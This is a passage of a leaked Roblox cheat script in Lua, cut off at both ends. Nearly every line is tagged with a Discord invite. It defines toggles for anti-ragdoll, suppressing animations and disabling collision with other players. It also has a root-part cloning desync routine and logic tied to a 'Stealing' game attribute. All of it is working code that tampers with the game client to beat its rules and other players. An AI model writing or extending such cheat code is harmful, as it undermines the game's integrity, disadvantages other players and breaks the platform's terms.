		local function slicedfn31()
			slicedfn30()  -- LEAKED BY SLICED | discord.gg/pubmethod
			flag2 = true
			slicedfn16()

			slicedfn18(localPlayer.CharacterAdded:Connect(function(character_)
				if flag2 then
					task.defer(function()
						if flag2 and character_ == localPlayer.Character then
							slicedfn29(character_)
						end
					end)
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
			end))

			slicedfn18(localPlayer.CharacterRemoving:Connect(function(character_)
				if flag2 and character_ == sliced14 then
					slicedn6 += 1
					slicedfn27()
					slicedfn17(tbl7)
					sliced14 = nil
					humanoid = nil
				end
			end))  -- LEAKED BY SLICED | discord.gg/pubmethod

			slicedfn18(localPlayer:GetAttributeChangedSignal("RagdollEndTime"):Connect(function()
				if flag2 then
					slicedfn28()
				end
			end))

			local packages = ReplicatedStorage:FindFirstChild("Packages")
			local net = packages and packages:FindFirstChild("Net")
			net = net and net:FindFirstChild("RE/CombatService/ApplyImpulse")

			if net then
				slicedfn18(net.OnClientEvent:Connect(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
					if flag2 then
						slicedfn20()
						slicedfn28()
					end
				end))
			end

			if localPlayer.Character then
				slicedfn29(localPlayer.Character)
			end
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		slicedfn2(slicedfn30)

		sliced6:CreateToggle({
			Name = "Anti Ragdoll",
			Default = true,
			Callback = function(arg)
				if arg then
					slicedfn31()
				else
					slicedfn30()
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
			end,
		})
	end

	do
		local flag2 = false
		local slicedn2 = 0
		local connection = nil
		local connection2 = nil
		local connection3 = nil
		local sliced12 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
		local tbl4 = {}

		local function slicedfn16(arg)
			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChildWhichIsA("Tool")
			if not character_ or not character_:IsA("Tool") then
				return false
			end
			local animation = arg.Animation
			local sliced13 = string.lower(tostring(arg.Name or ""))
			local sliced14 = string.lower(tostring(animation and animation.Name or ""))  -- LEAKED BY SLICED | discord.gg/pubmethod
			local priority = arg.Priority
			local flag3 = priority == Enum.AnimationPriority.Action or priority == Enum.AnimationPriority.Action2 or priority == Enum.AnimationPriority.Action3 or priority == Enum.AnimationPriority.Action4
			local flag4 = string.find(sliced13, "tool", 1, true) ~= nil or string.find(sliced13, "paint", 1, true) ~= nil or string.find(sliced13, "gun", 1, true) ~= nil or string.find(sliced14, "tool", 1, true) ~= nil or string.find(sliced14, "paint", 1, true) ~= nil or string.find(sliced14, "gun", 1, true) ~= nil
			return flag4 or flag3, flag4
		end

		local function slicedfn17()
			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn18()
			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn19(arg, arg2)
			local sliced13 = tbl4[arg]
			if not sliced13 then
				return
			end
			tbl4[arg] = nil

			if sliced13.WeightConnection then
				sliced13.WeightConnection:Disconnect()
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			if sliced13.StoppedConnection then
				sliced13.StoppedConnection:Disconnect()
			end

			if arg2 then
				pcall(function()
					if arg.IsPlaying then
						arg:AdjustWeight(sliced13.DesiredWeight, 0.1)
					end
				end)
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn20(arg)
			local tbl5 = {}

			for k in pairs(tbl4) do
				tbl5[#tbl5 + 1] = k
			end

			for _, sliced13 in ipairs(tbl5) do
				slicedfn19(sliced13, arg)
			end
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn21(arg)
			if not flag2 then
				return
			end
			local sliced13, sliced14 = slicedfn16(arg)

			if sliced13 then
				if tbl4[arg] then
					slicedfn19(arg, true)
				elseif sliced14 then
					pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
						if arg.IsPlaying and arg.WeightTarget <= 0 and arg.WeightCurrent <= 0.01 then
							arg:AdjustWeight(1, 0.05)
						end
					end)
				end

				return
			end

			if tbl4[arg] then
				return
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
			local slicedn3 = 1

			pcall(function()
				if arg.WeightTarget > 0 then
					slicedn3 = arg.WeightTarget
				elseif arg.WeightCurrent > 0 then
					slicedn3 = arg.WeightCurrent
				end
			end)

			local tbl5 = { Applying = false, DesiredWeight = slicedn3 }
			tbl4[arg] = tbl5  -- LEAKED BY SLICED | discord.gg/pubmethod

			tbl5.WeightConnection = arg:GetPropertyChangedSignal("WeightTarget"):Connect(function()
				if not flag2 or tbl5.Applying then
					return
				end

				if slicedfn16(arg) then
					slicedfn19(arg, true)
					return
				end

				pcall(function()
					local weightTarget = arg.WeightTarget  -- LEAKED BY SLICED | discord.gg/pubmethod

					if weightTarget > 0 then
						tbl5.DesiredWeight = weightTarget
					end

					tbl5.Applying = true
					arg:AdjustWeight(0, 0)
				end)

				tbl5.Applying = false
			end)

			tbl5.StoppedConnection = arg.Stopped:Connect(function()
				slicedfn19(arg, false)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end)

			tbl5.Applying = true

			pcall(function()
				arg:AdjustWeight(0, 0)
			end)

			tbl5.Applying = false
		end

		local function slicedfn22(arg)
			if not flag2 or arg ~= sliced12 then
				return  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			for _, sliced13 in ipairs(arg:GetPlayingAnimationTracks()) do
				slicedfn21(sliced13)
			end
		end

		local function slicedfn23(arg)
			slicedfn17()
			slicedfn18()
			slicedfn20(arg)
			sliced12 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn24(arg)
			slicedn2 += 1
			local sliced13 = slicedn2

			task.spawn(function()
				local humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 5)
				if not flag2 or slicedn2 ~= sliced13 or arg ~= localPlayer.Character or not humanoid then
					return
				end
				local animator = humanoid:FindFirstChildOfClass("Animator") or humanoid:WaitForChild("Animator", 5)  -- LEAKED BY SLICED | discord.gg/pubmethod
				if not flag2 or slicedn2 ~= sliced13 or arg ~= localPlayer.Character or not animator then
					return
				end
				slicedfn23(false)
				sliced12 = animator
				slicedfn22(animator)

				connection3 = animator.AnimationPlayed:Connect(function(arg2)
					if flag2 and sliced12 == animator then
						slicedfn21(arg2)
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end)

				local function slicedfn25(child)
					if not child:IsA("Tool") then
						return
					end

					task.defer(function()
						if flag2 and slicedn2 == sliced13 and arg == localPlayer.Character and sliced12 == animator then
							slicedfn22(animator)
						end
					end)  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				connection = arg.ChildAdded:Connect(slicedfn25)
				connection2 = arg.ChildRemoved:Connect(slicedfn25)
			end)
		end

		local connection4 = localPlayer.CharacterAdded:Connect(function(character_)
			if flag2 then
				slicedfn24(character_)
			end
		end)  -- LEAKED BY SLICED | discord.gg/pubmethod

		slicedfn2(function()
			flag2 = false
			slicedn2 += 1
			slicedfn23(true)

			if connection4 then
				connection4:Disconnect()
				connection4 = nil
			end
		end)

		sliced6:CreateToggle({  -- LEAKED BY SLICED | discord.gg/pubmethod
			Name = "No Animation",
			Default = true,
			Callback = function(arg)
				flag2 = arg == true

				if flag2 then
					local character_ = localPlayer.Character

					if character_ then
						slicedfn24(character_)
					end
				else  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedn2 += 1
					slicedfn23(true)
				end
			end,
		})
	end

	do
		local flag2 = false
		local slicedn2 = 0
		local connection = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
		local connection2 = nil
		local connection3 = nil
		local connection4 = nil
		local tbl4 = {}
		local tbl5 = {}
		local obj2 = setmetatable({}, { __mode = "k" })

		local function slicedfn16(arg)
			local flag3 = arg and arg:GetAttribute("Web") == true
			local flag4

			if flag3 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				local name = localPlayer.Name
				flag4 = arg:GetAttribute("WebTo") == name
			else
				flag4 = flag3
			end

			return flag4
		end

		local function slicedfn17(arg, arg2)
			if not flag2 or not arg.Parent or arg2.Applying then
				return  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
			local canCollide = false

			if slicedfn16(arg2.OwnerPlayer) then
				canCollide = arg2.OriginalCanCollide
			end

			if arg.CanCollide ~= canCollide then
				arg2.Applying = true

				pcall(function()
					arg.CanCollide = canCollide
				end)  -- LEAKED BY SLICED | discord.gg/pubmethod

				arg2.Applying = false
			end
		end

		local function slicedfn18(arg, arg2)
			local sliced12 = obj2[arg]
			if not sliced12 then
				return
			end
			obj2[arg] = nil

			if sliced12.CollisionConnection then  -- LEAKED BY SLICED | discord.gg/pubmethod
				sliced12.CollisionConnection:Disconnect()
			end

			if sliced12.DestroyingConnection then
				sliced12.DestroyingConnection:Disconnect()
			end

			if arg2 and arg.Parent then
				pcall(function()
					sliced12.Applying = true
					arg.CanCollide = sliced12.OriginalCanCollide
					sliced12.Applying = false  -- LEAKED BY SLICED | discord.gg/pubmethod
				end)
			end
		end

		local function slicedfn19(arg, ownerPlayer)
			if not flag2 then
				return
			end
			local sliced12 = obj2[arg]

			if sliced12 then
				sliced12.OwnerPlayer = ownerPlayer  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedfn17(arg, sliced12)
				return
			end

			local tbl6 = { Applying = false, OwnerPlayer = ownerPlayer, OriginalCanCollide = arg.CanCollide }
			obj2[arg] = tbl6

			tbl6.CollisionConnection = arg:GetPropertyChangedSignal("CanCollide"):Connect(function()
				if flag2 and not tbl6.Applying and arg.Parent then
					slicedfn17(arg, tbl6)
				end
			end)  -- LEAKED BY SLICED | discord.gg/pubmethod

			tbl6.DestroyingConnection = arg.Destroying:Connect(function()
				slicedfn18(arg, false)
			end)

			slicedfn17(arg, tbl6)
		end

		local function slicedfn20(arg, ownerPlayer)
			if not flag2 then
				return
			end
			local sliced12 = obj2[arg]  -- LEAKED BY SLICED | discord.gg/pubmethod

			if not sliced12 then
				slicedfn19(arg, ownerPlayer)
			else
				sliced12.OwnerPlayer = ownerPlayer
				slicedfn17(arg, sliced12)
			end
		end

		local function slicedfn21(arg, arg2)
			if arg.DescendantAddedConnection then
				arg.DescendantAddedConnection:Disconnect()  -- LEAKED BY SLICED | discord.gg/pubmethod
				arg.DescendantAddedConnection = nil
			end

			if arg.DescendantRemovingConnection then
				arg.DescendantRemovingConnection:Disconnect()
				arg.DescendantRemovingConnection = nil
			end

			local character_ = arg.Character
			arg.Character = nil
			if not character_ then
				return  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
			local tbl6 = {}

			for k in pairs(obj2) do
				if k:IsDescendantOf(character_) then
					tbl6[#tbl6 + 1] = k
				end
			end

			for _, sliced12 in ipairs(tbl6) do
				slicedfn18(sliced12, arg2)
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn22(arg, character_)
			local sliced12 = tbl4[arg]
			if not flag2 or not sliced12 or arg == localPlayer then
				return
			end
			slicedfn21(sliced12, false)
			sliced12.Character = character_

			for _, descendant in ipairs(character_:GetDescendants()) do
				if descendant:IsA("BasePart") then  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedfn20(descendant, arg)
				end
			end

			sliced12.DescendantAddedConnection = character_.DescendantAdded:Connect(function(descendant)
				if flag2 and descendant:IsA("BasePart") then
					slicedfn20(descendant, arg)
				end
			end)

			sliced12.DescendantRemovingConnection = character_.DescendantRemoving:Connect(function(descendant)
				if descendant:IsA("BasePart") then  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedfn18(descendant, false)
				end
			end)
		end

		local function slicedfn23(arg)
			if not arg:IsA("Model") then
				return false
			end
			return string.sub(string.lower(arg.Name), -6) == "_clone"
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn24(arg, arg2)
			local sliced12 = tbl5[arg]
			if not sliced12 then
				return
			end
			tbl5[arg] = nil

			if sliced12.DestroyingConnection then
				sliced12.DestroyingConnection:Disconnect()
				sliced12.DestroyingConnection = nil
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			slicedfn21(sliced12, arg2)
		end

		local function slicedfn25(arg)
			if not flag2 or tbl5[arg] or not slicedfn23(arg) then
				return
			end
			local tbl6 = { Character = arg }
			tbl5[arg] = tbl6

			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant:IsA("BasePart") then  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedfn20(descendant, nil)
				end
			end

			tbl6.DescendantAddedConnection = arg.DescendantAdded:Connect(function(descendant)
				if flag2 and descendant:IsA("BasePart") then
					slicedfn20(descendant, nil)
				end
			end)

			tbl6.DescendantRemovingConnection = arg.DescendantRemoving:Connect(function(descendant)
				if descendant:IsA("BasePart") then  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedfn18(descendant, false)
				end
			end)

			tbl6.DestroyingConnection = arg.Destroying:Connect(function()
				slicedfn24(arg, false)
			end)
		end

		local function slicedfn26()
			for _, child in ipairs(Workspace:GetChildren()) do
				if slicedfn23(child) then  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedfn25(child)

					for _, descendant in ipairs(child:GetDescendants()) do
						if descendant:IsA("BasePart") then
							slicedfn20(descendant, nil)
						end
					end
				end
			end

			local tbl6 = {}

			for k in pairs(tbl5) do  -- LEAKED BY SLICED | discord.gg/pubmethod
				if not k:IsDescendantOf(Workspace) then
					tbl6[#tbl6 + 1] = k
				end
			end

			for _, sliced12 in ipairs(tbl6) do
				slicedfn24(sliced12, false)
			end
		end

		local function slicedfn27(arg)
			for k, sliced12 in pairs(obj2) do  -- LEAKED BY SLICED | discord.gg/pubmethod
				if sliced12.OwnerPlayer == arg then
					slicedfn17(k, sliced12)
				end
			end
		end

		local function slicedfn28(arg, arg2)
			local sliced12 = tbl4[arg]
			if not sliced12 then
				return
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
			tbl4[arg] = nil
			slicedfn21(sliced12, arg2)

			if sliced12.CharacterAddedConnection then
				sliced12.CharacterAddedConnection:Disconnect()
			end

			if sliced12.CharacterRemovingConnection then
				sliced12.CharacterRemovingConnection:Disconnect()
			end

			if sliced12.WebConnection then
				sliced12.WebConnection:Disconnect()  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			if sliced12.WebTargetConnection then
				sliced12.WebTargetConnection:Disconnect()
			end
		end

		local function slicedfn29(arg)
			if arg == localPlayer or tbl4[arg] then
				return
			end
			local tbl6 = {}  -- LEAKED BY SLICED | discord.gg/pubmethod
			tbl4[arg] = tbl6

			tbl6.WebConnection = arg:GetAttributeChangedSignal("Web"):Connect(function()
				if flag2 then
					slicedfn27(arg)
				end
			end)

			tbl6.WebTargetConnection = arg:GetAttributeChangedSignal("WebTo"):Connect(function()
				if flag2 then
					slicedfn27(arg)
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
			end)

			tbl6.CharacterAddedConnection = arg.CharacterAdded:Connect(function(character_)
				if flag2 then
					slicedfn22(arg, character_)
				end
			end)

			tbl6.CharacterRemovingConnection = arg.CharacterRemoving:Connect(function(character_)
				if tbl6.Character == character_ then
					slicedfn21(tbl6, false)
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
			end)

			if arg.Character then
				slicedfn22(arg, arg.Character)
			end
		end

		local function slicedfn30()
			flag2 = false
			slicedn2 += 1

			if connection then
				connection:Disconnect()  -- LEAKED BY SLICED | discord.gg/pubmethod
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			if connection4 then
				connection4:Disconnect()
				connection4 = nil
			end

			local tbl6 = {}

			for k in pairs(tbl4) do
				tbl6[#tbl6 + 1] = k
			end

			for _, sliced12 in ipairs(tbl6) do
				slicedfn28(sliced12, true)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			local tbl7 = {}

			for k in pairs(tbl5) do
				tbl7[#tbl7 + 1] = k
			end

			for _, sliced12 in ipairs(tbl7) do
				slicedfn24(sliced12, true)
			end

			local tbl8 = {}

			for k in pairs(obj2) do  -- LEAKED BY SLICED | discord.gg/pubmethod
				tbl8[#tbl8 + 1] = k
			end

			for _, sliced12 in ipairs(tbl8) do
				slicedfn18(sliced12, true)
			end
		end

		local function slicedfn31()
			slicedn2 += 1
			local sliced12 = slicedn2

			task.spawn(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
				while flag2 and slicedn2 == sliced12 do
					for _, player in ipairs(Players:GetPlayers()) do
						if player ~= localPlayer then
							pcall(function()
								slicedfn29(player)
								local sliced13 = tbl4[player]
								local character_ = player.Character

								if sliced13 and character_ then
									if sliced13.Character ~= character_ then
										slicedfn22(player, character_)  -- LEAKED BY SLICED | discord.gg/pubmethod
									else
										for _, descendant in ipairs(character_:GetDescendants()) do
											if descendant:IsA("BasePart") then
												slicedfn20(descendant, player)
											end
										end
									end
								end
							end)
						end  -- LEAKED BY SLICED | discord.gg/pubmethod
					end

					slicedfn26()
					task.wait(1)
				end
			end)
		end

		local function slicedfn32()
			if flag2 then
				return
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
			flag2 = true

			connection = Players.PlayerAdded:Connect(function(player)
				slicedfn29(player)

				task.defer(function()
					local sliced12 = tbl4[player]
					local character_ = player.Character

					if flag2 and sliced12 and character_ and sliced12.Character ~= character_ then
						slicedfn22(player, character_)
					end
				end)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end)

			connection2 = Players.PlayerRemoving:Connect(function(player)
				slicedfn28(player, false)
			end)

			connection3 = Workspace.ChildAdded:Connect(function(child)
				if flag2 and slicedfn23(child) then
					slicedfn25(child)
				end
			end)

			connection4 = Workspace.ChildRemoved:Connect(function(child)  -- LEAKED BY SLICED | discord.gg/pubmethod
				if tbl5[child] then
					slicedfn24(child, false)
				end
			end)

			for _, player in ipairs(Players:GetPlayers()) do
				slicedfn29(player)
			end

			slicedfn26()
			slicedfn31()
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		slicedfn2(slicedfn30)

		sliced6:CreateToggle({
			Name = "Disable Player Collision",
			Note = "Lets you move through other players and player clones without being blocked.",
			Default = true,
			Callback = function(arg)
				if arg then
					slicedfn32()
				else
					slicedfn30()  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end,
		})
	end

	local animationId = "rbxassetid://18537363391"
	local slicedn2 = 5
	local slicedn3 = 1.5
	local slicedn4 = 0.04
	local flag2, flag3, flag4, flag5, flag6, flag7, slicedn5, slicedn6, clone, humanoidRootPart
	local sliced12, slicedn7  -- LEAKED BY SLICED | discord.gg/pubmethod

	do
		local slicedn8 = 0.01
		flag2 = false
		flag3 = false
		flag4 = false
		flag5 = true
		flag6 = false
		flag7 = false
		slicedn5 = 0.09
		slicedn6 = 225  -- LEAKED BY SLICED | discord.gg/pubmethod
		clone = nil
		humanoidRootPart = nil
		sliced12 = nil
		local hipHeight = nil
		local sliced13 = nil
		local slicedn9 = 0
		slicedn7 = 0
		local slicedn10 = 0
		local tbl4 = {}
		local sliced14 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
		local slicedn11 = 0
		local sliced15 = nil
		local slicedn12 = 0
		local slicedn13 = 0
		local sliced16 = nil
		local slicedn14 = 0
		local createSlider = nil

		local function slicedfn16(arg)
			if arg and arg.Connected then
				arg:Disconnect()  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
		end

		local function slicedfn17()
			for _, sliced17 in ipairs(tbl4) do
				slicedfn16(sliced17)
			end

			table.clear(tbl4)
		end

		local function slicedfn18(arg)
			tbl4[#tbl4 + 1] = arg  -- LEAKED BY SLICED | discord.gg/pubmethod
			return arg
		end

		local function slicedfn19(arg)
			if not arg or tbl2.ProtectedHumanoid ~= arg or arg.Health <= 0 then
				return false
			end

			local ok, result = pcall(function()
				return arg.BreakJointsOnDeath == false and arg.RequiresNeck == false and arg:GetStateEnabled(Enum.HumanoidStateType.Dead) == false
			end)

			return ok and result == true  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn20(arg, arg2)
			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant:IsA("Weld") or descendant:IsA("WeldConstraint") then
					local part0 = descendant.Part0
					local part1 = descendant.Part1

					if not (part0 and not part0:IsDescendantOf(arg)) then
						local flag8 = part1 and not part1:IsDescendantOf(arg)
						local sliced17 = nil
						local sliced18 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod

						if flag8 then
							local sliced19 = part0
							part0 = part1
							part1 = sliced19
						else
							part0 = sliced17
							part1 = sliced18
						end
					end

					if part0 and part0:IsA("BasePart") and part1 and part1:IsA("BasePart") and part1:IsDescendantOf(arg) and (part0.Position - arg2.Position).Magnitude <= 5 then  -- LEAKED BY SLICED | discord.gg/pubmethod
						return part0, part1
					end
				end
			end

			return nil
		end

		local function slicedfn21(arg)
			if localPlayer:GetAttribute("Stealing") ~= true then
				return nil
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
			local character_ = localPlayer.Character
			local tbl5 = { arg }

			if humanoidRootPart and humanoidRootPart.Parent and humanoidRootPart ~= arg then
				tbl5[#tbl5 + 1] = humanoidRootPart
			end

			local huge = math.huge
			local sliced17 = nil

			for _, child in ipairs(Workspace:GetChildren()) do
				if child:IsA("Model") and child ~= character_ and not Players:GetPlayerFromCharacter(child) and child.Name:sub(-6) ~= "_Clone" then
					local rootPart = child:FindFirstChild("RootPart") or child.PrimaryPart or child:FindFirstChildWhichIsA("BasePart")  -- LEAKED BY SLICED | discord.gg/pubmethod

					if rootPart and rootPart:IsA("BasePart") then
						for i_, sliced18 in ipairs(tbl5) do
							local sliced19, sliced20 = slicedfn20(child, sliced18)

							if sliced19 and sliced20 then
								local sliced21 = sliced18.CFrame:PointToObjectSpace(sliced19.Position)
								local magnitude = (sliced20.Position - sliced18.Position).Magnitude

								if math.abs(sliced21.X) <= 5 and sliced21.Y >= -3 and sliced21.Y <= 7 and sliced21.Z >= -7 and sliced21.Z <= 4 and magnitude <= 14 then
									local slicedn15 = (sliced19.Position - sliced18.Position).Magnitude + magnitude * 0.05 + (i_ - 1) * 0.01

									if slicedn15 < huge then
										huge = slicedn15  -- LEAKED BY SLICED | discord.gg/pubmethod
										sliced17 = child
									end
								end
							end
						end
					end
				end
			end

			return sliced17
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn22()
			if localPlayer:GetAttribute("Stealing") == true and sliced15 and sliced15.Parent then
				return sliced15
			end
			return nil
		end

		local function slicedfn23()
			slicedn12 += 1
			local sliced17 = slicedn12
			sliced15 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
			sliced16 = nil
			if not flag or not flag3 or not flag7 or localPlayer:GetAttribute("Stealing") ~= true then
				return
			end

			task.spawn(function()
				while flag and sliced17 == slicedn12 and flag3 and flag7 and localPlayer:GetAttribute("Stealing") == true do
					local character_ = localPlayer.Character
					character_ = character_ and character_:FindFirstChild("HumanoidRootPart")

					if character_ then
						local sliced18 = slicedfn21(character_)  -- LEAKED BY SLICED | discord.gg/pubmethod
						if sliced18 then
							sliced15 = sliced18
							return
						end
					end

					task.wait(0.15)
				end
			end)
		end

		local function slicedfn24(arg, arg2)  -- LEAKED BY SLICED | discord.gg/pubmethod
			local raycastParams = RaycastParams.new()
			raycastParams.FilterType = Enum.RaycastFilterType.Exclude
			raycastParams.IgnoreWater = true
			raycastParams.FilterDescendantsInstances = { localPlayer.Character, arg2, humanoidRootPart }
			local hit = Workspace:Raycast(arg.Position + Vector3.new(0, 8, 0), Vector3.new(0, -50, 0), raycastParams)
			return hit and hit.Position.Y or nil
		end

		local function slicedfn25(arg, arg2)
			return math.abs((arg - arg2 + 180) % 360 - 180)
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn26(arg, arg2)
			local sliced17 = slicedfn22()
			if not sliced17 or not humanoidRootPart or not humanoidRootPart.Parent then
				sliced16 = nil
				return
			end
			local sliced18 = slicedfn24(arg, sliced17)
			if not sliced18 then
				return
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			local ok, result, result2 = pcall(function()
				local boundingBox, sliced19 = sliced17:GetBoundingBox()
				return boundingBox, sliced19
			end)

			if not ok or not result or not result2 then
				return
			end
			local tbl5 = {}

			for i_ = -1, 1, 2 do
				for i_2 = -1, 1, 2 do  -- LEAKED BY SLICED | discord.gg/pubmethod
					for i_3 = -1, 1, 2 do
						local slicedn15 = #tbl5 + 1
						local cFrame = humanoidRootPart.CFrame
						local pointToObjectSpace = cFrame.PointToObjectSpace
						local sliced19 = result:PointToWorldSpace(Vector3.new(result2.X * 0.5 * i_, result2.Y * 0.5 * i_2, result2.Z * 0.5 * i_3))
						tbl5[slicedn15] = pointToObjectSpace(cFrame, sliced19)
					end
				end
			end

			local slicedn15 = arg.CFrame - Vector3.new(0, arg2.HipHeight + arg.Size.Y * 0.5 - 1 + slicedn5, 0)  -- LEAKED BY SLICED | discord.gg/pubmethod
			local slicedn16 = slicedn6 % 360
			local huge = math.huge
			local sliced19 = slicedn16

			for i_ = 0, 13 do
				local slicedn17 = 217 + i_
				local slicedn18 = slicedn15 * CFrame.Angles(math.rad(slicedn17), 0, 0)
				local tbl6 = {}
				local slicedn19 = -math.huge

				for _, sliced20 in ipairs(tbl5) do
					local y = slicedn18:PointToWorldSpace(sliced20).Y  -- LEAKED BY SLICED | discord.gg/pubmethod
					tbl6[#tbl6 + 1] = y

					if slicedn19 < y then
						slicedn19 = y
					end
				end

				local slicedn20 = slicedn19 - sliced18
				local sliced20, sliced21, sliced22 = ipairs(tbl6)
				local slicedn21 = 0
				local slicedn22 = 0
				local slicedn23 = 0  -- LEAKED BY SLICED | discord.gg/pubmethod

				for _, sliced23 in sliced20, sliced21, sliced22 do
					local slicedn24 = sliced23 - sliced18

					if slicedn8 < slicedn24 then
						slicedn21 += 1
						slicedn22 += slicedn24
					end

					if slicedn19 - sliced23 <= 0.035 then
						slicedn23 += 1
					end
				end  -- LEAKED BY SLICED | discord.gg/pubmethod

				local slicedn24

				if slicedn21 == 0 then
					slicedn24 = slicedn20 * 100 + slicedfn25(slicedn17, slicedn16) * 0.001
				else
					slicedn24 = slicedn21 * 1000 + slicedn23 * 100 + math.max(slicedn20, 0) * 50 + slicedn22 * 10 + slicedfn25(slicedn17, slicedn16) * 0.001
				end

				if slicedn24 < huge then
					huge = slicedn24
					sliced19 = slicedn17
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			sliced16 = sliced19
		end

		local function slicedfn27(arg, arg2, arg3)
			return (arg + ((arg2 - arg + 180) % 360 - 180) * arg3) % 360
		end

		local function slicedfn28()
			local sliced17 = Workspace:FindFirstChild(localPlayer.Name)
			if not sliced17 then
				return  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
			local doubleRig = sliced17:FindFirstChild("DoubleRig")

			if doubleRig then
				doubleRig:Destroy()
			end

			local constraints = sliced17:FindFirstChild("Constraints")

			if constraints then
				constraints:Destroy()
			end

			slicedfn18(sliced17.ChildAdded:Connect(function(child)  -- LEAKED BY SLICED | discord.gg/pubmethod
				if child.Name == "DoubleRig" or child.Name == "Constraints" then
					task.defer(function()
						if flag3 and child.Parent then
							child:Destroy()
						end
					end)
				end
			end))
		end

		local function slicedfn29()  -- LEAKED BY SLICED | discord.gg/pubmethod
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			if not character_ or not humanoid or not slicedfn19(humanoid) then
				return false
			end
			hipHeight = humanoid.HipHeight
			humanoidRootPart = character_:FindFirstChild("HumanoidRootPart")
			if not humanoidRootPart or not humanoidRootPart.Parent then
				return false
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
			sliced12 = character_
			local model = Instance.new("Model")
			model.Parent = game
			character_.Parent = model
			clone = humanoidRootPart:Clone()
			clone.Parent = character_
			humanoidRootPart.Parent = Workspace.CurrentCamera
			clone.CFrame = humanoidRootPart.CFrame
			character_.PrimaryPart = clone
			character_.Parent = Workspace  -- LEAKED BY SLICED | discord.gg/pubmethod

			for _, descendant in ipairs(character_:GetDescendants()) do
				if descendant:IsA("Weld") or descendant:IsA("Motor6D") then
					if descendant.Part0 == humanoidRootPart then
						descendant.Part0 = clone
					end

					if descendant.Part1 == humanoidRootPart then
						descendant.Part1 = clone
					end
				end
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			model:Destroy()
			return true
		end

		local function slicedfn30()
			local sliced17 = sliced12
			if not humanoidRootPart or not humanoidRootPart:IsDescendantOf(game) or not sliced17 then
				return false
			end

			if sliced17 ~= localPlayer.Character or sliced17.Parent ~= Workspace then
				if clone and clone.Parent then  -- LEAKED BY SLICED | discord.gg/pubmethod
					pcall(function()
						clone:Destroy()
					end)
				end

				if humanoidRootPart and humanoidRootPart.Parent then
					pcall(function()
						humanoidRootPart:Destroy()
					end)
				end

				return false  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			local ok = pcall(function()
				local model = Instance.new("Model")
				model.Parent = game
				sliced17.Parent = model
				humanoidRootPart.Parent = sliced17
				sliced17.PrimaryPart = humanoidRootPart
				sliced17.Parent = Workspace
				humanoidRootPart.CanCollide = true

				for _, descendant in ipairs(sliced17:GetDescendants()) do  -- LEAKED BY SLICED | discord.gg/pubmethod
					if descendant:IsA("Weld") or descendant:IsA("Motor6D") then
						if descendant.Part0 == clone then
							descendant.Part0 = humanoidRootPart
						end

						if descendant.Part1 == clone then
							descendant.Part1 = humanoidRootPart
						end
					end
				end

				if clone then  -- LEAKED BY SLICED | discord.gg/pubmethod
					local cFrame = clone.CFrame
					clone:Destroy()
					clone = nil
